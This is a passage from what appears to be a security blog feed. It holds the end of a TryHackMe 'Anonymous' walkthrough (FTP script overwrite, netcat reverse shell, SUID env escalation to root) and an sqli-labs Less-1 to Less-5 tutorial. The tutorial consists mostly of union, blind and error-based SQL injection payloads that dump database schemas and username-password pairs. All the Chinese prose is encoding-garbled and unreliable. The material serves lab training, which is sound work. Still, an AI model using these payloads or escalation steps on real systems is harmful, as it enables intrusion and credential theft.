data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0Lw==">shellåˆ©ç”¨<i class="fa fa-external-link-alt"></i></span></p><p><code>å¯¹æœåŠ¡å™¨æ–‡ä»¶è¿›è¡Œè¦†ç›–</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put clean.sh clean.sh </span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">54 bytes sent in 0.00 secs (1.0098 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬ç«¯å£ï¼Œä½¿ç”¨rlwrapå°±å¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šä¸‹ç®­å¤´äº†</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# rlwrap nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.9.248.83] from (UNKNOWN) [10.10.136.156] 49676</span><br><span class="line">bash: cannot set terminal process group (1144): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">namelessone</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">****************************</span><br></pre></td></tr></table></figure><h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><code>ä½¿ç”¨SUIDææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/nul</span><br><span class="line">æˆ–è€…</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZW52Lw==">envææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">pwd</span><br><span class="line">/home/namelessone</span><br><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page1(basic)</title>
    <link href="https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/"/>
    <id>https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/</id>
    <published>2021-01-10T05:39:49.000Z</published>
    <updated>2021-01-16T08:13:59.848Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page1(basic)</strong></p><a id="more"></a><h2 id="0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>æ­£å¸¸è®¿é—®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230221905854.png" class><p><code>æµ‹è¯•æŠ¥é”™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222040571.png" class><p><code>æ¢æµ‹å­—æ®µæ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><p><code>åˆ°4å›æ˜¾ï¼Œç»“æœä¸º3åˆ—</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222525420.png" class><p><code>unionæ³¨å…¥ï¼Œidéœ€ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ•°ï¼Œè¿›è¡Œçˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,database(),user() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230223306403.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><blockquote><p>select table_name from information_schema.tables where table_schema=â€™securityâ€™ limit 0,1;ä¸ºæŸ¥è¯¢securityæ•°æ®åº“çš„ç¬¬ä¸€å¼ è¡¨</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225728017.png" class><p><code>ä¾æ¬¡ç±»æ¨ï¼ŒæŸ¥è¯¢ç¬¬äºŒã€ä¸‰ã€å››å¼ ~</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225821260.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230132459.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230220235.png" class><p><code>å¯¹emailsè¡¨çˆ†å­—æ®µï¼Œä¸‹é¢ä¸ºç¬¬ä¸€ä¸ªå­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232717251.png" class><p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µå¦‚ä¸‹ï¼Œç¬¬ä¸‰ä¸ªå­—æ®µä¸ºç©º</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 2,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232456670.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232741394.png" class><p><code>çŸ¥é“äº†å­—æ®µåä¸è¡¨åå°±å¯ä»¥è¯»å–æ•°æ®äº†ï¼Œè¯»å–åˆ°äº†æœ¬ä¸è¯¥è®©ç”¨æˆ·è¯»å–åˆ°çš„å†…å®¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230233414685.png" class><h2 id="0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹"><a href="#0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹" class="headerlink" title="0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹"></a>0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹</h2><p><code>åŒLess1ï¼Œåªéœ€å°†å•å¼•å·å»æ‰å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-2/?id=0 union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·"><a href="#0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·"></a>0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess1ï¼ŒåŠ ä¸€ä¸ªæ‹¬å·ï¼Œè¿™æ˜¯ä¸€ä¸ªå˜å½¢é¢˜</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-3/?id=0&#x27;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess3ï¼Œåªéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-4/?id=0&quot;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·"><a href="#0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·" class="headerlink" title="0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·"></a>0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·</h2><p><code>æµ‹è¯•å‘ç°æ­£å¸¸?id=1æœ‰å›æ˜¾ï¼ŒåŠ ä¸Šå•å¼•å·ä¼šå‡ºç°æŠ¥é”™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174115897.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174144932.png" class><p><code>æ¥ç€æµ‹è¯•å‘ç°å½“æ¡ä»¶ä¸ºå‡æ—¶æ²¡æœ‰å›æ˜¾ï¼Œå­˜åœ¨boolæ³¨å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174447919.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174515636.png" class><p><code>æ¥ç€æµ‹è¯•å‘ç°å­˜åœ¨æ—¶é—´å»¶æ—¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and sleep(5) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231175223651.png" class><h3 id="1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥"><a href="#1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)"></a>1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)</h3><p><strong>å…ˆæ¥ç†è§£å‡ ä¸ªå‡½æ•°</strong></p><p><code>concatèšåˆå‡½æ•°</code></p><blockquote><p>ç®€å•çš„è¯´ï¼Œä½¿ç”¨èšåˆå‡½æ•°è¿›è¡ŒåŒæ³¨å…¥æŸ¥è¯¢æ—¶ï¼Œä¼šåœ¨é”™è¯¯ä¿¡æ¯ä¸­æ˜¾ç¤ºä¸€éƒ¨åˆ†é”™è¯¯ä¿¡æ¯ã€‚</p><p>æ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>å¦‚ä¸‹ä¾‹ï¼šæ•°æ®åº“ç‰ˆæœ¬ä¸º5.5.530</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231192403062.png" class><p><code>rand()å‡½æ•°</code></p><blockquote><p>rand() æ˜¯ä¸€ä¸ªéšæœºå‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼Œå¯ä»¥å½¢æˆå›ºå®šçš„ä¼ªéšæœºåºåˆ—ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ä¸€æ ·çš„ã€‚å¦‚ä¸‹å›¾</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231190859205.png" class><p><code>floor()å‡½æ•°</code></p><blockquote><p>floor() å‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿”å›å°äºç­‰äºæ‹¬å·å†…è¯¥å€¼çš„æœ€å¤§æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯å–æ•´ã€‚floor(rand(0)*2)è¾“å‡ºå¦‚ä¸‹ã€‚</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231191348407.png" class><p><code>group by</code></p><blockquote><p>group by ä¸»è¦ç”¨æ¥å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„ï¼ˆç›¸åŒçš„åˆ†ä¸ºä¸€ç»„ï¼Œç›¸åŒåå­—ä¼šåˆå¹¶ï¼‰</p></blockquote><p><code>count(*)</code></p><blockquote><p>count(*)ç”¨äºç»Ÿè®¡æ•°æ®å‡ºç°çš„æ¬¡æ•°</p></blockquote><p><strong>æ¢æµ‹åˆ—æ•°ï¼Œç»“æœä¸º3åˆ—</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231200902624.png" class><p><strong>çˆ†åº“</strong></p><blockquote><p>æŠ¥é”™æ—¶æ‰ä¼šå›æ˜¾</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIzNTQ5Ni5odG1s">é”®å€¼æŠ¥é”™åŸç†å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201157161.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201226057.png" class><p><strong>çˆ†è¡¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line">å°†table_schema=database()æ¢ä¸ºtable_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231204516748.png" class><p><strong>çˆ†usersè¡¨åˆ—å</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205019454.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205043144.png" class><p><strong>çˆ†å­—æ®µ</strong></p><blockquote><p>concat_wsç”¨äºæŒ‡å®šç¬¦å·æ‹¼æ¥ï¼Œæœ¬æ¬¡ä½¿ç”¨-æ‹¼æ¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 0,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 1,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 3,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231210556609.png" class><p><code>å¦ä¸€ç§æŠ¥é”™æ–¹å¼</code></p><blockquote><p>ä½¿ç”¨updatexmlå‡½æ•°ï¼Œupdatexml(XML_document, XPath_string, new_value);</p></blockquote><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>XML_document</td><td>Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</td></tr><tr><td>XPath_string</td><td>Xpathæ ¼å¼çš„å­—ç¬¦ä¸²</td></tr><tr><td>new_value</td><td>Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</td></tr></tbody></table><p><strong>payloadå¦‚ä¸‹</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select ***()),0x7e),1</span><br></pre></td></tr></table></figure><p><strong>åŸç†</strong></p><blockquote><p><code>concat()</code>å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆ<strong>XPATH_string</strong>çš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯</p></blockquote><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102233937461.png" class><p><code>ç®€å•çš„æ–¹æ³•</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234125500.png" class><p><code>ç”¨æˆ·ç‰ˆæœ¬ç­‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234201499.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234230939.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234706750.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234733739.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 2,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235422105.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235434612.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 